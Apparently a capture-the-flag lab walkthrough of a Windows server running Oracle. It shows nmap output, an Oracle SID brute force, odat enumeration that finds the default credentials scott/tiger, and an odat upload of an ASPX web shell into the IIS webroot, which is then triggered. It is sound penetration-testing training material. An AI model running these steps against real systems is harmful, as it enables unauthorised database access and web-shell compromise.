### Nmap

```bash
# Nmap 7.94SVN scan initiated Fri Dec 22 09:30:15 2023 as: nmap -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -sCV -A -T4 -O -oN nmap/port-scan 10.129.95.188
Nmap scan report for 10.129.95.188
Host is up (0.050s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (95%), Microsoft Windows Server 2012 Data Center (93%), Microsoft Windows Server 2012 or Server 2012 R2 (92%), Microsoft Windows 7 SP1 (92%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (92%), Microsoft Windows Windows 7 SP1 (92%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (92%), Microsoft Windows Vista SP1 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-22T08:32:31
|_  start_date: 2023-12-22T07:54:58

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   50.61 ms 10.10.14.1
2   50.70 ms 10.129.95.188

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 22 09:32:36 2023 -- 1 IP address (1 host up) scanned in 140.17 seconds
```
```bash
# sudo nmap -p1521 -sV 10.129.95.188 --open --script oracle-sid-brute
Nmap scan report for 10.129.95.188
Host is up (0.052s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```

#### Odat enumeration for Oracle TNS

```bash
# sudo odat all -s 10.129.95.188 --output-file scripts/odat-enumeration

[+] Checking if target 10.129.95.188:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.95.188:1521 is well configured. Continue...
[1] (10.129.95.188:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.95.188:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
[+] 'XE' is a valid SID. Continue... ########################################################################### | ETA: 00:00:00

[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)
[+] 'XE' is a valid SID. Continue... ############################################################## | ETA: 00:00:09
[+] SIDs found on the 10.129.95.188:1521 server: XE

[3] (10.129.95.188:1521): Searching valid Service Names
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.95.188:1521 server
[+] 'XE' is a valid Service Name. Continue... ########################################################################### | ETA: 00:00:00

[+] 'XEXDB' is a valid Service Name. Continue...
[3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)
[3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)

[+] 'XE' is a valid Service Name. Continue... ############################################################## | ETA: 00:00:09

[+] Service Name(s) found on the 10.129.95.188:1521 server: XE,XEXDB
[!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to dont do same checks twice
[4] (10.129.95.188:1521): Searching valid accounts on the XE SID
[+] Valid credentials found: scott/tiger. Continue... ################################################## | ETA: 00:01:12
[+] Accounts found on 10.129.95.188:1521/sid:XE:
scott/tiger

[5] (10.129.95.188:1521): Searching valid accounts on the XEXDB Service Name
[+] Valid credentials found: scott/tiger. Continue... ################################################## | ETA: 00:01:05
[+] Accounts found on 10.129.95.188:1521/serviceName:XEXDB:
scott/tiger
[6] (10.129.95.188:1521): Testing all authenticated modules on sid:XE with the scott/tiger account
[6.1] UTL_HTTP library ?
[-] KO
[6.2] HTTPURITYPE library ?
09:55:26 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-24247: network access denied by access control list (ACL) ORA-06512: at "SYS.HTTPURITYPE", line 34`
[-] KO
[6.3] UTL_FILE library ?
[-] KO
[6.4] JAVA library ?
[-] KO
[6.5] DBMSADVISOR library ?
[-] KO
[6.6] DBMSSCHEDULER library ?
[-] KO
[6.7] CTXSYS library ?
[-] KO
[6.8] Hashed Oracle passwords ?
[-] KO
[6.9] Hashed Oracle passwords with a view in ORACLE_OCM?
09:55:27 WARNING -: Hashes can not be got with Oracle_OCM. This method is only valid when database is 12c or higher
[-] KO
[-] KO
[6.10] Hashed Oracle passwords from history?
[-] KO
[6.11] DBMS_XSLPROCESSOR library ?
[-] KO
[6.12] External table to read files ?
[-] KO
[6.13] External table to execute system commands ?
[-] KO
[6.14] Oradbg ?
[-] KO
[6.15] DBMS_LOB to read files ?
[-] KO
[6.16] SMB authentication capture ?
[-] KO
[6.17] Gain elevated access (privilege escalation)?
[6.17.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[-] KO
[6.17.2] Modification of users passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[6.17.3] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[6.17.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[6.17.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[6.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[6.19] Create file on target (CVE-2018-3004)?
[-] KO
[6.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[-] KO
[7] (10.129.95.188:1521): Oracle users have not the password identical to the username ?
[-] No found a valid account on 10.129.95.188:1521/sid:XE with usernameLikePassword module
[8] (10.129.95.188:1521): Testing all authenticated modules on ServiceName:XEXDB with the scott/tiger account
[8.1] UTL_HTTP library ?
[-] KO
[8.2] HTTPURITYPE library ?
09:57:55 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-24247: network access denied by access control list (ACL) ORA-06512: at "SYS.HTTPURITYPE", line 34`
[-] KO
[8.3] UTL_FILE library ?
[-] KO
[8.4] JAVA library ?
[-] KO
[8.5] DBMSADVISOR library ?
[-] KO
[8.6] DBMSSCHEDULER library ?
[-] KO
[8.7] CTXSYS library ?
[-] KO
[8.8] Hashed Oracle passwords ?
[-] KO
[8.9] Hashed Oracle passwords with a view in ORACLE_OCM?
09:57:56 WARNING -: Hashes can not be got with Oracle_OCM. This method is only valid when database is 12c or higher
[-] KO
[-] KO
[8.10] Hashed Oracle passwords from history?
[-] KO
[8.11] DBMS_XSLPROCESSOR library ?
[-] KO
[8.12] External table to read files ?
[-] KO
[8.13] External table to execute system commands ?
[-] KO
[8.14] Oradbg ?
[-] KO
[8.15] DBMS_LOB to read files ?
[-] KO
[8.16] SMB authentication capture ?
[-] KO
[8.17] Gain elevated access (privilege escalation)?
[8.17.6] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[-] KO
[8.17.7] Modification of users passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[8.17.8] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[8.17.9] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[8.17.10] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[8.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[8.19] Create file on target (CVE-2018-3004)?
[-] KO
[8.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[-] KO
[9] (10.129.95.188:1521): Oracle users have not the password identical to the username ?
[-] No found a valid account on 10.129.95.188:1521/ServiceName:XEXDB with usernameLikePassword module
```

#### Upload a aspx shell with odat and trigger it

```bash
# /opt/odat/odat.py utlfile -s 10.129.36.208 -p 1521 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx shell.aspx

[1] (10.129.36.208:1521): Put the shell.aspx local file in the C:\inetpub\wwwroot folder like shell.aspx on the 10.129.36.208 server                                   
[+] The shell.aspx file was created on the C:\inetpub\wwwroot directory on the 10.129.36.208 server like the shell.aspx file

# Go to http://10.129.36.208/shell.aspx
```